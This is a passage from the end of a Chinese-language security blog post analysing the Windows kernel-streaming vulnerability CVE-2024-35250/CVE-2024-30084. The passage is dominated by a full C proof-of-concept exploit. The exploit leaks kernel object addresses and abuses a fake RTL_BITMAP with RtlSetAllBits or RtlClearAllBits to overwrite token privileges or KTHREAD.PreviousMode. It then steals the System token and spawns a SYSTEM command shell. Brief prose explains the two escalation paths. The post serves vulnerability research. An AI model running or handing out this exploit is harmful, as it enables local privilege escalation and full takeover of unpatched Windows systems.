+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">RTL_BITMAP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG SizeOfBitMap;</span><br><span class="line">    ULONG* Buffer;                    </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> stdcall <span class="title function_">RtlSetAllBits</span><span class="params">(PRTL_BITMAP BitMapHeader)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span>* Buffer;<span class="comment">//r8</span></span><br><span class="line">  <span class="type">unsigned</span> int64 v2; / rdx</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  Buffer = BitMapHeader-&gt;Buffer;</span><br><span class="line">  v2 = (<span class="type">unsigned</span> int64)(<span class="number">4</span> * (((BitMapHeader &gt; SizeOfBitMap &amp; <span class="number">0x1F</span>) != <span class="number">0</span> ) + (BitMapHeader-&gt;SizeOfBitMap &gt;&gt; <span class="number">5</span>))) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span>（ v2 )&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Buffer, <span class="number">0xFF</span>u, <span class="number">8</span> * (v2 &gt;&gt; <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> ((v2 &amp; <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">      Buffer[v2 - <span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>不过这样就不能用替换token的提权方式了, 只能直接修改Token-&gt;Privilege将其全部置位来开启所有权限</p>
+<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>网络上目前已经有公开的poc</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">				PoC Info</span></span><br><span class="line"><span class="comment">--------------------------------------------------------------</span></span><br><span class="line"><span class="comment">Vulnerability:	        CVE-2024-35250/CVE-2024-30084</span></span><br><span class="line"><span class="comment">Tested environment:	    Windows 11 22h2 Build 22621</span></span><br><span class="line"><span class="comment">						Windows 10 20h2 Build 19042</span></span><br><span class="line"><span class="comment">						VMWare Workstation 17 Pro</span></span><br><span class="line"><span class="comment">Weakness:		        CWE-822: Untrusted Pointer Dereference</span></span><br><span class="line"><span class="comment">Required privileges:    Medium IL</span></span><br><span class="line"><span class="comment">--------------------------------------------------------------</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __STREAMS__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _INC_MMREG</span></span><br><span class="line"><span class="comment">//#define _SEP_TOKEN_PRIVILEGES	0xc1b4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _PREVIOUS_MODE			0xbaba</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Ksproxy.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ksuser.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdllp.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;SetupAPI.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Advapi32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">	BOOL res = FALSE;</span><br><span class="line">	NTSTATUS status = <span class="number">0</span>;</span><br><span class="line">	<span class="type">uint32_t</span> Ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	hDevice = GetKsDevice(KSCATEGORY_DRM_DESCRAMBLE);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _SEP_TOKEN_PRIVILEGES</span></span><br><span class="line"></span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	<span class="type">uint64_t</span> ktoken_obj = <span class="number">0</span>;</span><br><span class="line">	res = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &amp;hToken);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!res)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open current process token\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	res = GetObjPtr(&amp;ktoken_obj, GetCurrentProcessId(), hToken);</span><br><span class="line">	<span class="keyword">if</span> (res != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Current process TOKEN address = %llx\n&quot;</span>, ktoken_obj);</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined _PREVIOUS_MODE</span></span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span> Sysproc = <span class="number">0</span>;</span><br><span class="line">	<span class="type">uint64_t</span> Curproc = <span class="number">0</span>;</span><br><span class="line">	<span class="type">uint64_t</span> Curthread = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	HANDLE hCurproc = <span class="number">0</span>;</span><br><span class="line">	HANDLE hThread = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">// Leak System _EPROCESS kernel address</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	Ret = GetObjPtr(&amp;Sysproc, <span class="number">4</span>, (HANDLE)<span class="number">4</span>);</span><br><span class="line">	<span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> Ret;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] System EPROCESS address: %llx\n&quot;</span>, Sysproc);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">// Leak Current _KTHREAD kernel address</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());</span><br><span class="line">	<span class="keyword">if</span> (hThread != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		Ret = GetObjPtr(&amp;Curthread, GetCurrentProcessId(), hThread);</span><br><span class="line">		<span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> Ret;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+] Current KTHREAD address: %llx\n&quot;</span>, Curthread);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">// Leak Current _EPROCESS kernel address</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	hCurproc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, GetCurrentProcessId());</span><br><span class="line">	<span class="keyword">if</span> (hCurproc != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		Ret = GetObjPtr(&amp;Curproc, GetCurrentProcessId(), hCurproc);</span><br><span class="line">		<span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> Ret;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+] Current EPROCESS address: %llx\n&quot;</span>, Curproc);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">// Initialize input buffer</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	pInBufProperty-&gt;Set = KSPROPSETID_DrmAudioStream;</span><br><span class="line">	pInBufProperty-&gt;Flags = KSPROPERTY_TYPE_UNSERIALIZESET;</span><br><span class="line">	pInBufProperty-&gt;Id = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">// Initialize output buffer</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	pSerialHdr-&gt;PropertySet = KSPROPSETID_DrmAudioStream;</span><br><span class="line"></span><br><span class="line">	pSerialHdr-&gt;Count = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">	pSerial-&gt;PropertyLength = <span class="keyword">sizeof</span>(EXPLOIT_DATA1);</span><br><span class="line">	pSerial-&gt;Id = <span class="number">0x0</span>;                <span class="comment">// Should be null</span></span><br><span class="line">	pSerial-&gt;PropTypeSet.Set = KSPROPSETID_DrmAudioStream;</span><br><span class="line">	pSerial-&gt;PropTypeSet.Flags = <span class="number">0x0</span>; <span class="comment">// Should be null</span></span><br><span class="line">	pSerial-&gt;PropTypeSet.Id = <span class="number">0x45</span>;   <span class="comment">// Irrelevant value</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">// Intialize fake property data</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="type">uint64_t</span> ntoskrnl_user_base = <span class="number">0</span>;</span><br><span class="line">	HMODULE outModule = <span class="number">0</span>;</span><br><span class="line">	UINT_PTR ntoskrnlBase = GetKernelModuleAddress(<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] ntoskrnl.exe base address = %llx\n&quot;</span>, ntoskrnlBase);</span><br><span class="line">	pOutBufPropertyData-&gt;FakeBitmap = (PRTL_BITMAP)AllocateBitmap(<span class="keyword">sizeof</span>(RTL_BITMAP), Ptr64(<span class="number">0x10000000</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _SEP_TOKEN_PRIVILEGES</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">// FakeBitmap initialization for the overwriting TOKEN.Privileges fields technique</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">// It should be (0x20 * n) to overwrite (n/2 * 0x8) bytes at arbitrary address</span></span><br><span class="line">	pOutBufPropertyData-&gt;FakeBitmap-&gt;SizeOfBitMap = <span class="number">0x20</span> * <span class="number">4</span>;</span><br><span class="line">	pOutBufPropertyData-&gt;FakeBitmap-&gt;Buffer = Ptr64(ktoken_obj + TOKEN_PRIV_WIN_11_22H2_22621);</span><br><span class="line">	pInBufPropertyData-&gt;ptr_ArbitraryFunCall = Ptr64(leak_gadget_address(<span class="string">&quot;RtlSetAllBits&quot;</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[!] RtlSetAllBits kernel address = %p\n&quot;</span>, pInBufPropertyData-&gt;ptr_ArbitraryFunCall);</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined _PREVIOUS_MODE</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">// FakeBitmap initialization for the overwriting KTHREAD.PreviousMode field technique</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	pOutBufPropertyData-&gt;FakeBitmap-&gt;SizeOfBitMap = <span class="number">0x20</span>;</span><br><span class="line">	pOutBufPropertyData-&gt;FakeBitmap-&gt;Buffer = Ptr64(Curthread + PREV_MODE_WIN_11_22H2_22621);</span><br><span class="line">	pInBufPropertyData-&gt;ptr_ArbitraryFunCall = Ptr64(leak_gadget_address(<span class="string">&quot;RtlClearAllBits&quot;</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[!] RtlClearAllBits kernel address = %p\n&quot;</span>, pInBufPropertyData-&gt;ptr_ArbitraryFunCall);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">// Send property request to trigger the vulnerability</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	res = SendIoctlReq(hDevice);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!res)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] SendIoctlReq failed\n&quot;</span>); <span class="comment">// It&#x27;s ok to see this message if exploit succeded</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _SEP_TOKEN_PRIVILEGES</span></span><br><span class="line"></span><br><span class="line">	HANDLE hWinLogon = OpenProcess(PROCESS_ALL_ACCESS, <span class="number">0</span>, GetPidByName(<span class="string">L&quot;winlogon.exe&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!hWinLogon)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] OpenProcess failed with error = %lx\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CreateProcessFromHandle(hWinLogon, (LPSTR)<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined _PREVIOUS_MODE</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[!] Leveraging DKOM to achieve LPE\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[!] Calling Write64 wrapper to overwrite current EPROCESS-&gt;Token\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	KPROCESSOR_MODE mode = UserMode; <span class="comment">// We set UserMode in restoring thread state phase to avoid BSOD in further process creations</span></span><br><span class="line"></span><br><span class="line">	Write64(Ptr64(Curproc + EPROCESS_TOKEN_WIN_11_22H2_22621), Ptr64(Sysproc + EPROCESS_TOKEN_WIN_11_22H2_22621), TOKEN_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">// Restoring KTHREAD.PreviousMode phase</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	Write64(Ptr64(Curthread + PREV_MODE_WIN_11_22H2_22621), &amp;mode, <span class="keyword">sizeof</span>(mode));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">// Spawn the shell with &quot;nt authority\system&quot;</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	system(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>提权之前的过程就是设置各个属性以及标志位让执行流成功到达目的代码, 并触发函数调用, 遇之前的漏洞描述符合一致</p>
+<p>该poc除了原文提到的提权方案之外, 还提供了一个类似的, 共两种提权方式</p>
+<ul>
+<li>一种是上面提到的使用RtlSetAllBits修改_SEP_TOKEN_PRIVILEGES直接开启所有权限, 然后打开一个高权限进程并以这个进程句柄为父句柄创建新进程</li>
+<li>还有一种是通过RtlClearAllBits将_ETHREAD.PreviousMode改为0, 从而有权限调用NtWriteVirtualMemory进行内核空间任意写, 替换Token,  在启动新进程之前还原回UserMode, 避免system触发BSOD</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%B5%81%E5%BC%8F%E4%BC%A0%E8%BE%93"><span class="toc-number">1.</span> <span class="toc-text">内核流式传输</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E4%BA%A4%E4%BA%92"><span class="toc-number">1.1.</span> <span class="toc-text">设备交互</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E8%B7%AF%E5%BE%84"><span class="toc-number">1.1.1.</span> <span class="toc-text">设备路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E8%AE%BE%E5%A4%87"><span class="toc-number">1.1.2.</span> <span class="toc-text">枚举设备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%B5%81%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.1.3.</span> <span class="toc-text">内核流对象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%B5%81%E5%BC%8F%E4%BC%A0%E8%BE%93%E6%9E%B6%E6%9E%84"><span class="toc-number">1.2.</span> <span class="toc-text">内核流式传输架构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ksthunk"><span class="toc-number">1.2.1.</span> <span class="toc-text">ksthunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ks"><span class="toc-number">1.2.2.</span> <span class="toc-text">ks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IOCTLKS-%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.3.</span> <span class="toc-text">IOCTLKS* 的工作流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%80%E5%9C%A8"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞所在</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EoP"><span class="toc-number">2.3.</span> <span class="toc-text">EoP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POC"><span class="toc-number">3.</span> <span class="toc-text">POC</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/51238/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/51238/&text=CVE-2024-35250分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/51238/&title=CVE-2024-35250分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/51238/&is_video=false&description=CVE-2024-35250分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CVE-2024-35250分析&body=Check out this article: https://ixout.github.io/posts/51238/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/51238/&title=CVE-2024-35250分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/51238/&title=CVE-2024-35250分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/51238/&title=CVE-2024-35250分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/51238/&title=CVE-2024-35250分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/51238/&name=CVE-2024-35250分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/51238/&t=CVE-2024-35250分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    ixout
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
